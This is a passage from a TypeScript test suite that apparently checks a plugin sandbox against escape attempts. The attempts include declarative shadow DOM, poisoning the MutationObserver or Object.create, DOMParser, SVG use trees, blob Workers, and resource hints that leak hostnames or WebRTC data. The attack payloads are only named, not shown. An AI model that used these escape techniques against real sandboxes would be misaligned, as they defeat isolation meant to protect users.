    const iframe = createPluginIframe(DECLARATIVE_SHADOW_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    await waitFor(() => denied, "the declarative shadow attack to finish");

    expect(childReports).toEqual([]);
    // Denying the API is the mitigation; if any of these starts succeeding
    // again, the `<template shadowrootmode="closed">` inside it comes back with
    // it and nothing downstream can see the frame.
    expect(denied).toEqual(["write", "setHTMLUnsafe", "parseHTMLUnsafe"]);
  });

  it("cannot get a child realm by disarming the observer itself", async () => {
    const childReports: string[] = [];
    let swept = false;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as { exfil?: number; type?: string; tag?: string; ice?: string };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        swept = true;
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(OBSERVER_POISON_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    await waitFor(() => (swept ? true : null), "the observer-poison attack to finish");

    expect(childReports).toEqual([]);
  });

  it("cannot get a child realm by poisoning what the observer reads", async () => {
    const childReports: string[] = [];
    let swept = false;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as { exfil?: number; type?: string; tag?: string; ice?: string };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        swept = true;
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(OBSERVER_INIT_POISON_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    await waitFor(() => (swept ? true : null), "the observer-init poison attack to finish");

    // Joined so the failure names the tags and says whether the child's WebRTC
    // actually started gathering, rather than printing `[ …(2) ]`.
    expect(childReports.join(" ")).toBe("");
  });

  it("cannot get a child realm by owning the shell's own Object.create", async () => {
    const childReports: string[] = [];
    let swept: string | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        tag?: string;
        ice?: string;
        note?: string;
      };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        swept = data.note ?? "";
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(BARE_POISON_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    const note = await waitFor(() => swept, "the bare() poison attack to finish");

    // The wrapper's whole job is to force `mode: "open"`; if this says "closed"
    // the plugin already owns the argument, whatever the frame report says.
    expect(childReports.join(" ")).toBe("");
    // The wrapper exists to force `mode: "open"`; "closed" means the plugin owns
    // the argument even when no frame report happens to arrive.
    expect(note).toBe("open");
  });

  it("cannot get a closed shadow root out of DOMParser", async () => {
    const childReports: string[] = [];
    let swept: string | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        tag?: string;
        ice?: string;
        note?: string;
      };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        swept = data.note ?? "";
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(DOMPARSER_SHADOW_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    const note = await waitFor(() => swept, "the DOMParser shadow attack to finish");

    // Named in the message so a failure says which ordering got through and
    // whether the child's WebRTC actually started gathering.
    expect(`${childReports.join(" ")} | ${note}`).toBe(
      " | adopt:kids=1;shadow=none import:kids=1;shadow=none",
    );
  });

  it("cannot get a realm from an SVG use tree or a blob Worker", async () => {
    const childReports: string[] = [];
    let swept: string | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        tag?: string;
        rtc?: string;
        note?: string;
      };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.rtc}`);
      }
      if (data.type === "swept") {
        swept = data.note ?? "";
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage(
          { exfil: 1, type: "attack", imageUrl: `${location.origin}/pwa-icon-192.png` },
          "*",
        );
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(REALM_PROBE_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    const note = await waitFor(() => swept, "the realm probe to finish");

    expect(`${childReports.join(" ")} | ${note}`).toBe("PROBE");
  });

  it("cannot leak a hostname through a resource hint in its markup", async () => {
    let rels: string[] | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as { exfil?: number; type?: string; rels?: string[] };
      if (data?.exfil === 1 && data.type === "hints") rels = data.rels ?? [];
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(RESOURCE_HINT_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    // Nested one included: the sanitiser has to walk the subtree, not just the
    // markup's top level.
    expect(await waitFor(() => rels, "the resource-hint attack to finish")).toEqual([]);
  });
});
